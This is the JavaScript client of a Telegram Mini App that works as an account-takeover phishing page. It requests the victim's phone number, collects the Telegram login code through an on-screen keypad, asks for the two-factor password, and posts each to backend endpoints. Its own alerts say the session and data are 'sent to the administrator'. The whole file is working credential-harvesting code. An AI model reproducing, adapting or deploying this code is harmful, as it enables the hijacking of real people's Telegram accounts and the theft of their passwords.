const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

// Элементы
const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const step3 = document.getElementById('step3');
const phoneDisplay = document.getElementById('phoneDisplay');
const phoneDisplay2 = document.getElementById('phoneDisplay2');
const error1 = document.getElementById('error1');
const error2 = document.getElementById('error2');
const error3 = document.getElementById('error3');
const digits = [
    document.getElementById('d1'),
    document.getElementById('d2'),
    document.getElementById('d3'),
    document.getElementById('d4'),
    document.getElementById('d5')
];
const resendBtn = document.getElementById('resendBtn');
const deleteBtn = document.getElementById('deleteBtn');
const digitBtns = document.querySelectorAll('.digit-btn');
const manualSection = document.querySelector('.manual-section');
const telegramSection = document.querySelector('.telegram-section');
const phoneInput = document.getElementById('phone');
const getCodeBtn = document.getElementById('getCodeBtn');
const passwordInput = document.getElementById('passwordInput');
const submitPasswordBtn = document.getElementById('submitPasswordBtn');

let currentPhone = '';
let currentCode = '';
let codeRequested = false;

// Определяем окружение
const isTelegram = tg.initData && tg.initDataUnsafe?.user;
const chatId = isTelegram ? tg.initDataUnsafe.user.id : null;

if (isTelegram) {
    manualSection.style.display = 'none';
    telegramSection.style.display = 'block';
    requestContactAutomatically();
} else {
    manualSection.style.display = 'block';
    telegramSection.style.display = 'none';
}

// Автоматический запрос контакта в Telegram
function requestContactAutomatically() {
    tg.requestContact((success, contact) => {
        if (!success) {
            error1.textContent = 'Необходимо предоставить номер телефона для продолжения.';
            telegramSection.innerHTML = '<p>Вы отклонили запрос. <button id="retryBtn">Повторить</button></p>';
            document.getElementById('retryBtn')?.addEventListener('click', () => {
                error1.textContent = '';
                telegramSection.innerHTML = '<p>Запрашиваем номер...</p><div class="loader"></div>';
                requestContactAutomatically();
            });
            return;
        }
        const phone = contact.phone_number;
        sendPhoneToServer(phone, chatId);
    });
}

// Отправка номера на сервер
function sendPhoneToServer(phone, chatId) {
    error1.textContent = '';
    if (isTelegram) telegramSection.innerHTML = '<p>Отправка номера...</p><div class="loader"></div>';

    fetch('/api/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, chatId })
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            currentPhone = phone;
            phoneDisplay.textContent = phone;
            step1.style.display = 'none';
            step2.style.display = 'block';
            codeRequested = true;
            digits.forEach(d => d.value = '');
            currentCode = '';
            if (data.warning) error2.textContent = data.warning;
        } else {
            error1.textContent = data.error || 'Ошибка сервера';
            if (isTelegram) {
                telegramSection.innerHTML = '<p>Ошибка. <button id="retryBtn">Повторить</button></p>';
                document.getElementById('retryBtn')?.addEventListener('click', () => {
                    error1.textContent = '';
                    telegramSection.innerHTML = '<p>Запрашиваем номер...</p><div class="loader"></div>';
                    requestContactAutomatically();
                });
            }
        }
    })
    .catch(err => {
        error1.textContent = 'Ошибка сети';
        console.error(err);
        if (isTelegram) {
            telegramSection.innerHTML = '<p>Ошибка сети. <button id="retryBtn">Повторить</button></p>';
            document.getElementById('retryBtn')?.addEventListener('click', () => {
                error1.textContent = '';
                telegramSection.innerHTML = '<p>Запрашиваем номер...</p><div class="loader"></div>';
                requestContactAutomatically();
            });
        }
    });
}

// Обработчик ручного ввода (для браузера)
if (getCodeBtn) {
    getCodeBtn.addEventListener('click', () => {
        const phone = phoneInput.value.trim();
        if (!phone) {
            error1.textContent = 'Введите номер';
            return;
        }
        sendPhoneToServer(phone, null);
    });
}

// Цифровая клавиатура
digitBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        if (!codeRequested) return;
        const digit = btn.getAttribute('data-digit');
        if (currentCode.length < 5) {
            currentCode += digit;
            digits[currentCode.length - 1].value = digit;
            if (currentCode.length === 5) verifyCode();
        }
    });
});

deleteBtn.addEventListener('click', () => {
    if (currentCode.length > 0) {
        digits[currentCode.length - 1].value = '';
        currentCode = currentCode.slice(0, -1);
    }
});

// Повторная отправка кода
resendBtn.addEventListener('click', () => {
    if (!currentPhone) return;
    resendBtn.disabled = true;
    resendBtn.textContent = 'Отправка...';

    fetch('/api/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: currentPhone, chatId })
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            error2.textContent = 'Код отправлен повторно' + (data.warning ? ' (' + data.warning + ')' : '');
            setTimeout(() => error2.textContent = '', 3000);
        } else {
            error2.textContent = data.error || 'Ошибка';
        }
    })
    .catch(() => {
        error2.textContent = 'Ошибка сети';
    })
    .finally(() => {
        resendBtn.disabled = false;
        resendBtn.textContent = 'Reenviar código';
    });
});

// Проверка кода
function verifyCode() {
    error2.textContent = '';
    fetch('/api/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: currentPhone, code: currentCode })
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            alert('Код подтверждён! Сессия отправлена администратору.');
            if (isTelegram) tg.close();
        } else if (data.needPassword) {
            // Требуется пароль
            step2.style.display = 'none';
            step3.style.display = 'block';
            phoneDisplay2.textContent = currentPhone;
            passwordInput.value = '';
            error3.textContent = '';
        } else {
            error2.textContent = data.error || 'Неверный код';
            digits.forEach(d => d.value = '');
            currentCode = '';
        }
    })
    .catch(err => {
        error2.textContent = 'Ошибка сети';
        digits.forEach(d => d.value = '');
        currentCode = '';
    });
}

// Отправка пароля (2FA)
submitPasswordBtn.addEventListener('click', () => {
    const password = passwordInput.value.trim();
    if (!password) {
        error3.textContent = 'Введите пароль';
        return;
    }
    submitPasswordBtn.disabled = true;
    submitPasswordBtn.textContent = 'Отправка...';

    fetch('/api/submit-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: currentPhone, password })
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            alert('Пароль принят! Данные отправлены администратору.');
            if (isTelegram) tg.close();
        } else {
            error3.textContent = data.error || 'Ошибка';
        }
    })
    .catch(() => {
        error3.textContent = 'Ошибка сети';
    })
    .finally(() => {
        submitPasswordBtn.disabled = false;
        submitPasswordBtn.textContent = 'ENVIAR CONTRASEÑA';
    });
});

// Поддержка физической клавиатуры (опционально)
document.addEventListener('keydown', (e) => {
    if (!codeRequested || step2.style.display !== 'block') return;
    if (e.key >= '0' && e.key <= '9') {
        if (currentCode.length < 5) {
            currentCode += e.key;
            digits[currentCode.length - 1].value = e.key;
            if (currentCode.length === 5) verifyCode();
        }
    } else if (e.key === 'Backspace') {
        if (currentCode.length > 0) {
            digits[currentCode.length - 1].value = '';
            currentCode = currentCode.slice(0, -1);
        }
    }
});